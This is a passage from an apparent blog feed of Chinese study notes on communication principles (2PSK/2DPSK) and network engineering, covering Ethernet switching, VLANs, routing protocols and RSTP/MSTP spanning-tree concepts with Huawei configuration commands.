2PSK信号及2DPSK信号的功率谱密度有何特点?试将它们与OOK信号的功率谱密度加以比较。</p><blockquote><p>2PSK信号的功率谱密度同样由离散谱和连续谱组成，但当双极性基带信号以相等的概率出现时，不存在离散谱部分。同时，连续谱部分与2ASK信号基本相同，因此，2PSK信号的带宽也与2ASK信号相同。此外，2DPSK信号的带宽也与2ASK信号的相同</p></blockquote><p>补充2DPSK如何克服π现象？</p><p>DPSK</p><pre class="line-numbers language-none"><code class="language-none">2PSK的“倒∏现象”或“反向工作”:在波形图中,假设相干载波的基准相位与2PSK信号的调制载波的基准相位一致(通常默认为0相位)。但是,由于在2PSK信号的载波恢复过程中存在着的相位模糊,即恢复的本地载波与所需的相干载波可能同相,也可能反相,这种相位关系的不确定性将会造成解调出的数字基带信号与发送的数字基带信号正好相反,即“1”变为“0”,“0”变为“1”,判决器输出数字信号全部出错。这种现象称为2PSK 方式的“倒π”现象或“反相工作”。这也是2PSK方式在实际中很少采用的主要原因。另外,在随机信号码元序列中,信号波形有可能出现长时间连续的正弦波形,致使在接收端无法辨认信号码元的起止时刻。为了解决上述问题,可以采用差分相移键控(DPSK)体制。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre> <center><img src="D:\gitee-blog\source\_posts\子域名深度挖掘\2DPSK相干解调法.png" style="zoom:50%;" /></center> ]]></content>
      
      
      
        <tags>
            
            <tag> 通信原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络工程思考题</title>
      <link href="/2023/03/08/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/"/>
      <url>/2023/03/08/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="网络工程思考题"><a href="#网络工程思考题" class="headerlink" title="网络工程思考题"></a>网络工程思考题</h3><p>[TOC]</p><p><strong>网络三大核心：交换、路由、服务</strong></p><h4 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h4><img src="https://shierjinghuang.github.io/2022/04/15/计算机网络//OSI与TCP协议对比.png" style="zoom: 50%;" /><ul><li>1.2.1  网络的体系结构和协议</li><li>   协议三要素：语法、语义和同步（定时关系）</li><li>1.3     网络的拓扑结构<ul><li>   网络的拓扑结构是指网络中节点之间物理的或逻辑的连接方式</li><li>   5种基本的拓扑结构：网状、星形、树形、总线型和环形</li></ul></li></ul><h4 id="第二章-局域网技术"><a href="#第二章-局域网技术" class="headerlink" title="第二章 局域网技术"></a>第二章 局域网技术</h4><h5 id="2-3-以太网的基本技术"><a href="#2-3-以太网的基本技术" class="headerlink" title="2.3 以太网的基本技术"></a>2.3 以太网的基本技术</h5><blockquote><p>媒体访问控制技术：以太网采用共享媒体方式传输数据信息，即连接在一个以太网上的所有站点使用公共的总线收发数据</p></blockquote><ul><li><p>以太网的媒体访问控制方式使用载波侦听多路访问/冲突检测协议，即CSMA/CD协议，解决站点对共享总线的访问</p></li><li><p>决定发送帧时间的算法:</p><ul><li>非坚持CSMA</li><li>1-坚持CSMA</li><li>P-坚持CSMA</li></ul></li><li><p><strong>CSMA/CD协议发送数据流程:</strong></p><img src="https://shierjinghuang.github.io/2022/04/15/计算机网络/CSMA-CD发送协议.png" style="zoom:50%;" /></li><li><p><strong>冲突时间：</strong></p><ul><li><p>冲突时间是站点开始发送帧时，帧可能发生冲突所花费时间的上限</p><p>冲突时间的作用：</p><ul><li>冲突时间是检测一次冲突所需的最少，超过了该时间，再也不会冲突</li><li>确定了帧的“最小帧长度”</li><li>决定了在总线上出现的最大帧碎片长度</li><li>可以作为冲突后帧要重新发送所需的基本时间延迟计算的基本单位</li></ul></li></ul></li></ul><p><strong>曼彻斯特编码</strong>：在每一位时间的中间，信号有一个跳变，由高到低的跳变用来表示1，由低到高的跳变用来表示0</p><p><strong>不归零制编码的缺点</strong></p><blockquote><ul><li>接收方很难确定一位的开始和结束，特别是在连续多位相同是容易混淆，需要同步信号辅助</li><li>当传输的数据中“1”和“0”的个数不均衡时，会存在直流分量，将影响接收方的正确接收</li></ul></blockquote><h5 id="2-4-10MBps以太网"><a href="#2-4-10MBps以太网" class="headerlink" title="2.4 10MBps以太网"></a>2.4 10MBps以太网</h5><blockquote><p>网卡：网络接口卡，又称网络适配器，通常安装在网络站点内，负责站点和网络之间的通信</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">网卡的基本功能<span class="token comment"># 提供与站点主机的接口电路，数据缓存器的管理，数据链路控制和管理，编码和译码，网络信息的收发</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="2-7-以太网的交换技术"><a href="#2-7-以太网的交换技术" class="headerlink" title="2.7 以太网的交换技术"></a>2.7 以太网的交换技术</h5><ol><li><p>以太网交换原理：源地址学习，目的地址转发（自学习转发算法）</p></li><li><p>网桥与桥接技术：网桥属于数据链路层网络设备，主要用于连接两个局域网</p><ul><li>网桥的操作过程<ul><li>侦听每个端口上是否有帧到达，保存到达帧的源MAC地址以及接收它的端口号到站缓冲区，查看接收到的每个帧的目的MAC地址。</li><li>广播MAC地址，或站缓冲区中无此地址，转发该帧到所有其它端口；站缓冲区中存在该MAC地址，则转发到相应端口；如果源MAC地址和目的MAC地址所对应的端口相同，则将该帧丢弃</li></ul></li><li>网桥与集线器的重要区别<ul><li>网桥阻止一个局域网的报文传输到另外一个局域网中去，缩小冲突域，增加网络带宽</li></ul></li></ul></li><li><p>生成树协议：</p><p>在存在冗余链路的情况下，在网络中标识出一条无环链路，并临时关闭非工作链路中的网桥端口，当网络中任何一条链路的状态发生变化时，网桥将根据生成树协议重新计算是否因为链路状态的改变而出现新的回路，如果工作链路出现了故障导致帧不能通过，生成树协议将重新计算出一条新的无环链路</p><ul><li>有向无环图，根本目的防止形成回路</li><li>分为生成树协议（STP）与快速生成树协议（RSTP）<ul><li>spanning-tree mode ?                     // 查看支持的生成树协议</li><li>spanning-tree mode rapid-pvst     // 快速生成树协议</li></ul></li></ul></li><li><p>全双工以太网技术：是指在条网络链路上可以同时进行数据接收和发送</p></li></ol><ul><li>广域网中的链路通常是全双工的,但局域网以前一直 工作在半双工方式下。在实际组网时,交换机与交换机之间、交换机与单个工作站之间一毅都采用全双工传输方式。</li></ul><ol start="5"><li>以太网交换机：以太网交换机采用以太网交换技术实现对报文的快速转发，是交换式以太网中区不可少的网络设备。在OSI参考模型中，以太网交换机属于工作在第二层的网络设备<ul><li>交换机的交换方式：静态交换方式与动态交换方式<ul><li>静态交换方式：端口之间是通过人工设置的固定连接来交换数据帧的</li><li>动态交换方式：端口之间是通过动态学习后形成交换通道实现数据帧的交换的</li></ul></li><li>交换机的重要特征：MAC地址表大小、端口的自适应能力、模块的热插拔、端口限速、背板总线带宽、转发速率、端口聚合</li><li> 动态交换方式分为：<strong>存储转发交换方式、直通交换方式、无碎片交换方式</strong></li><li>如何访问交换机：通过交换机中的控制台端口、通过telnet远程登录交换机、通过web方式访问交换机、使用专用的网络管理软件访问交换机（配置、访问等详细命令亮仔整理了）</li></ul></li></ol><h5 id="2-8-虚拟局域网（VLAN）"><a href="#2-8-虚拟局域网（VLAN）" class="headerlink" title="2.8 虚拟局域网（VLAN）"></a>2.8 虚拟局域网（VLAN）</h5><blockquote><p>利用交换机对帧传输的控制能力，在网络的物理拓扑结构基础上建立多个逻辑网络</p></blockquote><ol><li><p>vlan特点：地理位置无关性、划分广域网、系统配置默认使用vlan 1</p></li><li><p>vlan划分：基于端口、基于MAC地址、基于网络层的vlan</p></li><li><p><strong>Vlan技术的优点：隔离网络广播风暴、增强了网络安全性、简化网络管理和维护、提高网络性能</strong></p></li><li><p>实现三个通信：</p><ul><li>无vlan通信</li><li>同一vlan间通信</li><li>不同vlan间通信：三层交换机实现vlan间通信、二层交换机与路由器实现vlan间通信</li></ul></li><li><p>vlan中继协议（VTP）：（实验看亮仔整理）</p><ul><li><p>vtp能否辅助vlan进行接口划分？</p></li><li><p>三种模式：</p><p>①server：<strong>服务器 — 在 VTP 服务器模式下，可创建、修改和删除 VLAN，并为整个 VTP 域指定其他配置参数</strong></p><p>②client：<strong>客户端 — VTP 客户端的行为与 VTP 服务器相同，学习vlan划分不学习接口划分，但不能在 VTP 客户端上创建、更改或删除 VLAN</strong></p><p>③transparent：<strong>透明 — VTP 透明交换机不参加 VTP</strong></p></li></ul></li></ol><p>2.9 无线局域网 <del>（不知道写的啥，看书吧）</del> <strong><del>（其实就是没有讲）</del></strong></p><h4 id="第三章-广域网和网络接入"><a href="#第三章-广域网和网络接入" class="headerlink" title="第三章 广域网和网络接入"></a>第三章 广域网和网络接入</h4><ol><li><p>接入网技术</p><ul><li>电话与拨号接入，ISDN接入，ADSL接入，光纤同轴电缆混合网（HFC），光纤接入，无线接入技术</li></ul></li><li><p>公用数据网：</p><ul><li>不可靠，报文传输</li><li>帧中继，可变帧长，通过链路实现可靠</li></ul></li></ol><h4 id="第四章-网络的互联技术"><a href="#第四章-网络的互联技术" class="headerlink" title="第四章 网络的互联技术"></a>第四章 网络的互联技术</h4><ol><li><p>IP协议功能：</p><img src="https://shierjinghuang.github.io/2022/04/15/计算机网络/IP协议报文.png" style="zoom: 40%;" /><ul><li>寻址与路由</li><li>分段与重组<ul><li>分段：将数据报拆分成一个个能够适合下层技术传输的小数据报</li><li>重组：到达目的地后，需要将拆分后的多个数据报重组成原始数据报</li></ul></li></ul></li><li><p><strong>划分子网、构造超网</strong>（考虑本学期课上讲过，应该有应用题，请看计算机网络课本）</p></li><li><p>静态划分、DHCP动态主机分配协议</p><ul><li><p>静态划分：</p><img src="https://shierjinghuang.github.io/2022/04/15/计算机网络/子网的静态划分.png" style="zoom:50%;" /><ul><li>网络地址：IP地址中主机地址部分全为0</li><li>广播地址：IP地址中主机地址部分全为1</li><li>0.0.0.0<ul><li>代表路由表的缺省路由</li><li>代表主机本身（尚未获得IP地址情况下）</li></ul></li><li>255.255.255.255：受限广播或本地广播</li><li>127.0.0.0/8：Loopback地址，用于测试TCP/IP</li></ul></li><li><p>DHCP动态主机分配协议</p><img src="https://shierjinghuang.github.io/2022/04/15/计算机网络/DHCP动态主机分配协议.png" style="zoom:50%;" /></li></ul></li><li><p>网络地址转换-NAT</p><blockquote><p>缘由：IP地址严重不足</p></blockquote><ul><li><p>静态NAT：实现内部IP和外部IP的一对一映射，但不能节约IP地址</p></li><li><p>动态NAT：从多个外部地址中选择一个对应内部地址，最多只能有k台内部主机同时访问Internet</p></li><li><p>端口NAT（NAPT）：只要一个外部地址，通过TCP和UDP的端口号在内部地址和外部地址之间建立映射关系，进行内部地址和外部地址的转换</p></li></ul></li><li><p>静态路由、动态路由、默认路由</p><ul><li>静态路由：由网络管理员手工配置，不会根据网络变化而自动调整</li><li>动态路由：根据路由信息自动生成，适用于大型网络，可以提高网络的健壮性和性能</li><li>默认路由：默认路由Default Gateway，也称缺省路由，在没有找到匹配的路由项时所使用的路由，在路由表中，默认路由以到网络0.0.0.0/0的形式出现</li></ul></li><li><p>动态路由协议</p><ul><li>路由信息协议（RIP）<ul><li>典型的距离向量路由协议，具有实现简单、开销小等优点，不适用于大型网络</li><li><strong>RIP协议中的路由循环问题（个人感觉会有）</strong><ul><li>触发更新：一旦路由器的路由信息表发生变化，立刻向邻居路由器广播更新后的路由信息表，而不必等上0～30秒时间到下一个广播周期再发送路由信息表</li><li>水平分割：不向路由信息的来源路由器回传自身的路由信息</li><li>带毒性逆转的水平分割：向路由信息的来源路由器回传路由信息时，距离值被设为16</li></ul></li></ul></li><li>最短路径优先路由协议（OSPF路由协议）<ul><li>OSPF：Open Shortest Path First，开放的最短路径优先路由协议</li><li>OSPF是一种典型的链路状态路由协议，每个OSPF路由器均维护着一个数据库，它反映了整个网络的拓扑结构</li></ul></li></ul></li><li><p>访问控制列表</p><ul><li>标准ACL</li><li>扩展ACL</li></ul></li><li><p>虚拟专用网虚拟专用网</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>生成树的改进 RSTP与MSTP</title>
      <link href="/2023/03/06/%E7%94%9F%E6%88%90%E6%A0%91%E7%9A%84%E6%94%B9%E8%BF%9B%20RSTP%E4%B8%8EMSTP/"/>
      <url>/2023/03/06/%E7%94%9F%E6%88%90%E6%A0%91%E7%9A%84%E6%94%B9%E8%BF%9B%20RSTP%E4%B8%8EMSTP/</url>
      
        <content type="html"><![CDATA[<h1 id="生成树的改进-RSTP与MSTP"><a href="#生成树的改进-RSTP与MSTP" class="headerlink" title="生成树的改进 RSTP与MSTP"></a>生成树的改进 RSTP与MSTP</h1><p>[TOC]</p><h2 id="快速生成树协议RSTP"><a href="#快速生成树协议RSTP" class="headerlink" title="快速生成树协议RSTP"></a>快速生成树协议RSTP</h2><blockquote><p>IEEE 802.1W中定义的RSTP可以视为STP的改进版本，RSTP在许多方面对STP进行了优化，它的收敛速度更快，而且能够兼容STP</p></blockquote><h3 id="RSTP对STP的改进："><a href="#RSTP对STP的改进：" class="headerlink" title="RSTP对STP的改进："></a>RSTP对STP的改进：</h3><ul><li>RSTP对STP的改进：<ul><li>通过端口角色的增补，简化了生成树协议的理解及部署；</li><li>端口状态的重新划分；</li><li>配置BPDU格式的改变，充分利用了STP协议报文中的Flag字段，明确了端口角色；</li><li>配置BPDU的处理发生变化；</li><li>快速收敛；</li><li>增加保护功能。</li></ul></li></ul><h4 id="改进点1：端口角色的改进："><a href="#改进点1：端口角色的改进：" class="headerlink" title="改进点1：端口角色的改进："></a>改进点1：端口角色的改进：</h4><p>RSTP的端口角色共有4种：根端口、指定端口、Alternate端口和Backup端口。</p><p> <center><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\Alternate端口.png" alt="Alternate端口" style="zoom: 67%;" /><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\备份端口.png" alt="备份端口"style="zoom: 67%;" /> </center></p>根端口和指定端口的作用同STP中定义，Alternate端口和Backup端口的描述如下：<ul><li>从配置BPDU报文发送角度来看：<ul><li>Alternate端口就是由于学习到其它网桥发送的配置BPDU报文而阻塞的端口</li><li>Backup端口就是由于学习到自己发送的配置BPDU报文而阻塞的端口</li></ul></li><li>从用户流量角度来看：<ul><li>Alternate端口提供了从指定桥到根的另一条可切换路径，作为根端口的备份端口</li><li>Backup端口作为指定端口的备份，提供了另一条从根桥到相应网段的备份通路</li></ul></li></ul><blockquote><p>给一个RSTP域内所有端口分配角色的过程就是整个拓扑收敛的过程</p></blockquote><h4 id="改进点2：端口状态的改进"><a href="#改进点2：端口状态的改进" class="headerlink" title="改进点2：端口状态的改进"></a>改进点2：端口状态的改进</h4><p>RSTP的状态规范缩减为3种，根据端口是否转发用户流量和学习MAC地址来划分:</p><ul><li>Discarding状态：不转发用户流量也不学习MAC地址</li><li>Learning状态：不转发用户流量但是学习MAC地址</li><li>Forwarding状：既转发用户流量又学习MAC地址。</li></ul><table><thead><tr><th align="center">STP端口状态</th><th align="center">RSTP端口状态</th><th align="center">端口在拓扑中的角色</th></tr></thead><tbody><tr><td align="center">Forwarding</td><td align="center">Forwarding</td><td align="center">包括根端口、指定端口</td></tr><tr><td align="center">Learning</td><td align="center">Learning</td><td align="center">包括根端口、指定端口</td></tr><tr><td align="center">Listening</td><td align="center">Discarding</td><td align="center">包括根端口、指定端口</td></tr><tr><td align="center">Blocking</td><td align="center">Discarding</td><td align="center">包括Alternate端口、Backup端口</td></tr><tr><td align="center">Disabled</td><td align="center">Discarding</td><td align="center">包括Disable端口</td></tr></tbody></table><h4 id="改进点3：配置BPDU-RST-BPDU"><a href="#改进点3：配置BPDU-RST-BPDU" class="headerlink" title="改进点3：配置BPDU - RST BPDU"></a>改进点3：配置BPDU - RST BPDU</h4><p><strong>RSTP的配置BPDU充分利用了STP报文中的Flag字段，明确了端口角色</strong></p><ul><li>除了保证和STP格式基本一致之外，RSTP作了如下变化：<ul><li>Type字段：配置BPDU类型不再是0而是2，所以运行STP的设备收到RSTP的配置BPDU时会丢弃</li><li>Flag字段：使用了原来保留的中间6位，这样改变的配置BPDU叫做RST BPDU</li></ul></li></ul><h5 id="RST-BPDU报文格式："><a href="#RST-BPDU报文格式：" class="headerlink" title="RST BPDU报文格式："></a>RST BPDU报文格式：</h5><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\RST BPDU报文格式.png" alt="RST BPDU报文格式" style="zoom: 67%;" /><h5 id="RST-BPDU与STP配置BPDU报文格式不同点"><a href="#RST-BPDU与STP配置BPDU报文格式不同点" class="headerlink" title="RST BPDU与STP配置BPDU报文格式不同点"></a>RST BPDU与STP配置BPDU报文格式不同点</h5><ul><li>BPDU类型，1 Byte，RST BPDU的类型值为0x02。</li><li>标志，1 Byte，包括：<ul><li>bit 7：TCA，表示拓扑变化确认；</li><li>bit 6：Agreement，表示同意，用于P/A机制；</li><li>bit 5：Forwarding，表示转发状态；</li><li>bit 4：Learning，表示学习状态；</li><li>bit 3和bit 2：表示端口角色, 00表示未知端口, 01表示替代或备份端口, 10表示根端口, 11表示指定端口</li><li>bit 1：Proposal，表示提议，用于P/A机制；</li><li>bit 0：TC，表示拓扑变化。</li></ul></li></ul><h4 id="改进点4：配置BPDU的处理"><a href="#改进点4：配置BPDU的处理" class="headerlink" title="改进点4：配置BPDU的处理"></a>改进点4：配置BPDU的处理</h4><h5 id="RSTP对配置BPDU的发送方式进行了改进"><a href="#RSTP对配置BPDU的发送方式进行了改进" class="headerlink" title="RSTP对配置BPDU的发送方式进行了改进"></a>RSTP对配置BPDU的发送方式进行了改进</h5><blockquote><p>在拓扑稳定后，无论非根桥设备是否接收到根桥传来的配置BPDU报文，非根桥设备仍然按照Hello Time规定的时间间隔发送配置BPDU，该行为完全由每台设备自主进行</p></blockquote><h5 id="更短的BPDU超时时间"><a href="#更短的BPDU超时时间" class="headerlink" title="更短的BPDU超时时间"></a>更短的BPDU超时时间</h5><p>如果一个端口在超时时间（即三个周期，超时时间＝Hello Time×3）内没有收到上游设备发送过来的配置BPDU，那么该设备认为与此邻居之间的协商失败</p><blockquote><p>STP需要先等待一个Max Age</p></blockquote><h5 id="处理次优BPDU"><a href="#处理次优BPDU" class="headerlink" title="处理次优BPDU"></a>处理次优BPDU</h5><p>当一个端口收到上游的指定桥发来的RST BPDU报文时，该端口会将自身缓存的RST BPDU与收到的RST BPDU进行比较如果该端口缓存的RST BPDU优于收到的RST BPDU，那么该端口会直接丢弃收到的RST BPDU，立即回应自身缓存的RST BPDU，从而加快收敛速度</p><ul><li><p>STP：      STP只有指定端口会立即处理次优BPDU，其他端口会忽略次优BPDU，等到Max Age计时器超时后，缓存的次优BPDU才会老化，然后发送自身更优的BPDU，进行新一轮的拓扑收敛。</p></li><li><p>RSTP：   RSTP处理次优BPDU报文不再依赖于任何定时器，解决拓扑收敛，同时RSTP的任何端口角色都会处理次优BPDU，从而加快了拓扑收敛。</p></li></ul><h4 id="改进点5：快速收敛机制"><a href="#改进点5：快速收敛机制" class="headerlink" title="改进点5：快速收敛机制"></a>改进点5：快速收敛机制</h4><h5 id="快速收敛机制："><a href="#快速收敛机制：" class="headerlink" title="快速收敛机制："></a>快速收敛机制：</h5><ul><li><p>如果网络中一个根端口失效，那么网络中最优的Alternate端口将成为根端口，进入Forwarding状态。因为通过这个Alternate端口连接的网段上必然有个指定端口可以通往根桥</p></li><li><p>如果网络中一指定端口失效，那么网络中最优的Backup端口将成为指定端口，进入Forwarding状态。因为Backup端口作为指定端口的备份，提供了另一条从根桥到相应网段的备份通路</p></li></ul><center><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\根端口快速切换.png" alt="根端口快速切换" style="zoom:67%;" /><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\指定端口快速切换.png" alt="指定端口快速切换" style="zoom:67%;" /></center>##### 边缘端口 (Edge Port)机制：<blockquote><p>在RSTP里面，如果某一个端口位于整个网络的边缘，即不再与其他交换设备连接，而是直接与终端设备直连，这种端口可以设置为边缘端口</p></blockquote><p>边缘端口不参与RSTP计算，可以由Discarding直接进入Forwarding状态，同时边缘端口的UP和Down，不会引起网络拓扑的变动</p><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\RSTP边缘端口.png" alt="RSTP边缘端口" style="zoom: 50%;" /><p>但是一旦边缘端口收到配置BPDU，就丧失了边缘端口属性，成为普通STP端口，并重新进行生成树计算，从而引起网络震荡</p><h5 id="Proposal-Agreement机制："><a href="#Proposal-Agreement机制：" class="headerlink" title="Proposal/Agreement机制："></a>Proposal/Agreement机制：</h5><p>简称P/A机制，RSTP通过P/A机制加快了上游端口进入Forwarding状态的速度。<br>当一个端口被选举成为指定端口之后,会先进入Discarding状态，再通过P/A机制快速进入Forwarding状态</p><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\Proposal_Agreement机制：.png" alt="P/A机制" style="zoom:67%;" /><p>事实上对于STP，指定端口的选择可以很快完成，主要的速度瓶颈在于：为了避免环路，必须等待足够长的时间，使全网的端口状态全部确定，也就是说必须要等待至少一个Forward Delay所有端口才能进行转发。<br>而RSTP的主要目的就是消除这个瓶颈，通过阻塞自己的非根端口来保证不会出现环路。而使用P/A机制加快了上游端口进入Forwarding状态的速度。</p><h4 id="改进点6：拓扑变更机制"><a href="#改进点6：拓扑变更机制" class="headerlink" title="改进点6：拓扑变更机制"></a>改进点6：拓扑变更机制</h4><p>在RSTP中检测拓扑是否发生变化只有一个标准：一个非边缘端口迁移到Forwarding状态。</p><p>一旦检测到拓扑发生变化，将进行如下处理：<br>为本交换设备的所有非边缘指定端口和根端口启动一个TC While Timer，该计时器值是Hello Time的两倍。在这个时间内，清空状态发生变化的端口上学习到的MAC地址。<br>同时，由非边缘指定端口和根端口向外发送RST BPDU，其中TC置位。一旦TC While Timer超时，则停止发送RST BPDU。<br>其他交换设备接收到RST BPDU后，清空所有端口（除了收到RST BPDU的端口和边缘端口）学习到MAC地址，然后也为自己所有的非边缘指定端口和根端口启动TC While Timer，重复上述过程。<br>如此，网络中就会产生RST BPDU的泛洪。</p><h3 id="RSTP与STP的兼容"><a href="#RSTP与STP的兼容" class="headerlink" title="RSTP与STP的兼容"></a>RSTP与STP的兼容</h3><blockquote><p>RSTP可以兼容STP：RSTP可以和STP互操作，但是此时会丧失快速收敛等RSTP优势。</p></blockquote><p>当一个网段里既有运行STP的交换设备又有运行RSTP的交换设备，STP交换设备会忽略RSTP的BPDU</p><p>运行RSTP的交换设备在某端口上接收到运行STP的交换设备发出的配置BPDU，在两个Hello Time时间之后，便把自己的端口转换到STP工作模式，发送配置BPDU，从而实现了互操作。</p><h3 id="RSTP的基本配置"><a href="#RSTP的基本配置" class="headerlink" title="RSTP的基本配置"></a>RSTP的基本配置</h3><p>RSTP的配置指令与STP的基本配置指令相同此处介绍不同指令：</p><p><strong>设置RSTP</strong></p><pre class="line-numbers language-ensp" data-language="ensp"><code class="language-ensp">[Huawei] stp mode rstp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>配置当前接口为边缘端口</strong></p><pre class="line-numbers language-ensp" data-language="ensp"><code class="language-ensp">[Huawei-GigabitEthernet0&#x2F;0&#x2F;1] stp edged-port enable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>缺省情况下，交换设备的所有端口都是非边缘端口。</p><h4 id="RSTP的保护功能配置命令"><a href="#RSTP的保护功能配置命令" class="headerlink" title="RSTP的保护功能配置命令"></a>RSTP的保护功能配置命令</h4><p><strong>配置BPDU保护功能</strong></p><pre class="line-numbers language-ensp" data-language="ensp"><code class="language-ensp">[Huawei] stp bpdu-protection<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置交换设备边缘端口的BPDU保护功能。缺省情况下，交换设备的BPDU保护功能处于禁用状态。</p><p><strong>配置根保护功能</strong></p><pre class="line-numbers language-ensp" data-language="ensp"><code class="language-ensp">[Huawei-GigabitEthernet0&#x2F;0&#x2F;1] stp root-protection<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置交换设备的根保护功能。缺省情况下，端口的根保护功能处于去使能状态。当端口的角色是指定端口时，配置的根保护功能才生效。配置了根保护的端口，不可以配置环路保护</p><p><strong>配置环路保护功能</strong></p><pre class="line-numbers language-ensp" data-language="ensp"><code class="language-ensp">[Huawei-GigabitEthernet0&#x2F;0&#x2F;1] stp loop-protection<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置交换设备根端口或Alternate端口的环路保护功能。缺省情况下，端口的环路保护功能处于关闭状态</p><p><strong>配置TC保护功能</strong></p><pre class="line-numbers language-none"><code class="language-none">[Huawei] stp tc-protection interval interval-value<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置设备处理阈值指定数量的拓扑变化报文所需的时间。缺省情况下，设备处理最大数量的拓扑变化报文所需的时间是Hello Time</p><h4 id="RSTP与STP的不足"><a href="#RSTP与STP的不足" class="headerlink" title="RSTP与STP的不足"></a>RSTP与STP的不足</h4><blockquote><p>流量无法负载分担 和 二层次优路径</p></blockquote><h2 id="多生成树协议（MSTP）"><a href="#多生成树协议（MSTP）" class="headerlink" title="多生成树协议（MSTP）"></a>多生成树协议（MSTP）</h2><blockquote><p>MSTP是IEEE 802.1S中定义的生成树协议，MSTP兼容STP和RSTP，既可以快速收敛，又提供了数据转发的多个冗余路径，在数据转发过程中实现VLAN数据的负载均衡</p></blockquote><p>MSTP可以将一个或多个VLAN映射到一个Instance（实例），再基于Instance计算生成树，映射到同一个Instance的VLAN共享同一棵生成树</p><h3 id="MSTP的基本概念"><a href="#MSTP的基本概念" class="headerlink" title="MSTP的基本概念"></a>MSTP的基本概念</h3><h4 id="MST-Region"><a href="#MST-Region" class="headerlink" title="MST Region"></a>MST Region</h4><ul><li><p>MSTP网络层次：</p><ul><li>MSTP把一个交换网络划分成多个域，每个域内形成多棵生成树，生成树之间彼此独立。</li></ul></li><li><p>MST Region（Multiple Spanning Tree Region，多生成树域），也可简称MST域</p><ul><li>由交换网络中的多台交换设备以及它们之间的网段所构成</li><li>一个局域网可以存在多个MST域，各MST域之间在物理上直接或间接相连。用户可以通过MSTP配置命令把多台交换设备划分在同一个MST域内</li><li>MSTP网络中包含1个或多个MST域，每个MST域中包含一个或多个多生成树实例。</li></ul></li><li><p>同一个MST域的设备具有下列特点：</p><ul><li>都启动了MSTP，具有相同的域名，具有相同的VLAN到生成树实例映射配置，具有相同的MSTP修订级别配置</li></ul></li></ul><h4 id="MSTI"><a href="#MSTI" class="headerlink" title="MSTI"></a>MSTI</h4><p>Multiple Spanning Tree Instance，多生成树实例：一个MST域内可以生成多棵生成树，每棵生成树都称为一个MSTI，MSTI使用Instance ID标识，华为设备取值为0~4094。</p><ul><li><p><strong>VLAN映射表</strong><br>MST域的属性，描述了VLAN和MSTI之间的映射关系。<br>如图所示的MST Region 4的VLAN映射有：</p><center><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\MST域与.png" style="zoom:67%;" />    ----->>>        <img src="D:\blog\shierjinghuang\source\_posts\生成树协议\多生成树实例.png" alt="多生成树实例" style="zoom: 67%;" /></center><ul><li>VLAN1映射到MSTI 1，VLAN2映射到MSTI 2，其余VLAN映射到MSTI 3</li></ul></li><li><p>Instance0是缺省存在的，而且缺省时，华为交换机上所有的VLAN都映射到了Instance0。</p></li><li><p>通过设置VLAN映射表，把VLAN和MSTI联系起来</p><p>每个VLAN只能对应一个MSTI，即同一VLAN的数据只能在一个MSTI中传输，而一个MSTI可能对应多个VLAN</p></li></ul><h4 id="CST（Common-Spanning-Tree，公共生成树）"><a href="#CST（Common-Spanning-Tree，公共生成树）" class="headerlink" title="CST（Common Spanning Tree，公共生成树）"></a>CST（Common Spanning Tree，公共生成树）</h4><p>是连接交换网络内所有MST域的一棵生成树。<br>如果把每个MST域看作是一个节点，CST就是这些节点通过生成树协议计算生成的一棵生成树。</p><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\交换网络实例.png" alt="交换网络实例" style="zoom: 50%;" /><p>如图深蓝色粗线条连接各个域构成CST。</p><p>IST（Internal Spanning Tree，内部生成树）<br>是各MST域内的一棵生成树。<br>IST是一个特殊的MSTI，MSTI的Instance ID为0。<br>如图所示的MST Region 4，黑色细线条在域中连接该域的所有交换设备构成IST。</p><p>CIST（Common and Internal Spanning Tree，公共和内部生成树）<br>通过生成树协议计算生成的，连接一个交换网络内所有交换设备的单生成树。<br>如图所示，所有MST域的IST加上CST就构成一棵完整的生成树，即CIST。</p><h3 id="MSTP的端口"><a href="#MSTP的端口" class="headerlink" title="MSTP的端口"></a>MSTP的端口</h3><h4 id="MSTP端口角色"><a href="#MSTP端口角色" class="headerlink" title="MSTP端口角色"></a>MSTP端口角色</h4><blockquote><p>MSTP中定义的所有端口角色包括：根端口、指定端口、Alternate端口、Backup端口、Master端口、域边缘端口和边缘端口</p></blockquote><table><thead><tr><th>端口角色</th><th align="left">说明</th></tr></thead><tbody><tr><td>根端口</td><td align="left">在非根桥上，离根桥最近的端口是本交换设备的根端口。根端口负责向树根方向转发数据</td></tr><tr><td>指定端口</td><td align="left">对一台交换设备而言，它的指定端口是向下游交换设备转发BPDU报文的端口。</td></tr><tr><td>Alternate端口</td><td align="left">从配置BPDU报文发送角度来看，Alternate端口就是由于学习到其它网桥发送的配置BPDU报文而阻塞的端口。从用户流量角度来看，Alternate端口提供了从指定桥到根的另一条可切换路径，作为根端口的备份端口。</td></tr><tr><td>Backup端口</td><td 